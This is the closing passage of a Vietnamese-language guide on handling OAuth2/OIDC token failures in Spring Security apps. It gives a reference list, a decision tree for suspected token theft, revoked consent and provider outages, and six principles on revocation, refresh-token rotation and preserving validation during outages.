- Spring Security — `RemoveAuthorizedClientOAuth2AuthorizationFailureHandler` Javadoc: https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/RemoveAuthorizedClientOAuth2AuthorizationFailureHandler.html
- Spring Security — `RemoveAuthorizedClientReactiveOAuth2AuthorizationFailureHandler` Javadoc: https://docs.spring.io/spring-security/reference/api/java/org/springframework/security/oauth2/client/RemoveAuthorizedClientReactiveOAuth2AuthorizationFailureHandler.html
- OWASP Secrets Management Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
- OWASP Logging Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html

## 34. Tổng kết: không để “xử lý lỗi token” trở thành lỗ hổng bảo mật

~~~text
Event xảy ra:
  |
  +-- Token nghi bị đánh cắp
  |      -> incident triage / quarantine
  |      -> revoke token/grant hoặc rotate client key
  |      -> cleanup local clients + session nếu cần
  |      -> reauthorize/recover + monitor
  |
  +-- Quyền bị thu hồi / invalid_grant
  |      -> dừng refresh token cũ
  |      -> phân biệt consent revoke vs refresh race
  |      -> REAUTH_REQUIRED khi cần
  |      -> không tự nâng scope/admin
  |
  +-- Provider outage / 429 / 503
         -> preserve valid credentials
         -> bounded retry, jitter, circuit breaker
         -> degraded UX, no auth bypass
         -> verify recovery, no token storm

Phân biệt:
  removeAuthorizedClient != revoke at Authorization Server
  local/OP logout != Access Token revocation
  invalid_grant != confirmed token theft
  provider outage != user revoked consent
  JWT signature cache != permission to skip validation
~~~

**Sáu nguyên tắc cần nhớ:**

1. **Phân loại nguồn và error code trước khi hành động.** Token Endpoint `invalid_grant`, Resource Server `invalid_token`/`insufficient_scope` và provider 503 không cùng một nghĩa.
2. **Credential compromise cần incident workflow**, gồm containment, scope assessment, revocation/rotation, monitoring và reauthorization. Xóa token cache không phải ứng cứu đầy đủ.
3. **RFC 7009 có semantics rõ ràng:** 200 là trạng thái revoke đã đạt hoặc token vốn invalid; 503 nghĩa là chưa được coi token đã revoke. Không xóa bản sao duy nhất trước khi có kế hoạch pending revoke.
4. **Refresh Token rotation yêu cầu quản lý concurrency.** `invalid_grant` có thể do replay hoặc race hợp lệ; optimistic locking/single-flight giúp không xóa nhầm token mới.
5. **Provider outage không cho phép hạ cấp bảo mật.** Bounded retry, jitter, circuit breaker và degraded mode phải giữ nguyên xác minh OIDC, tenant và Resource Server authorization.
6. **Spring Security manager/filter chỉ là một phần của hệ thống.** Failure handlers giúp xử lý stale authorized clients, nhưng token theft, key rotation, user notifications, cross-node invalidation và incident evidence cần application/security operations phối hợp.

Ứng dụng OAuth2/OIDC Client chỉ thực sự bền vững khi có thể **ngắt kết nối đúng phạm vi**, **không tiếp tục dùng credential bị nghi lộ**, **tôn trọng quyền bị thu hồi** và **vượt qua sự cố provider mà không phá vỡ ranh giới bảo mật**.
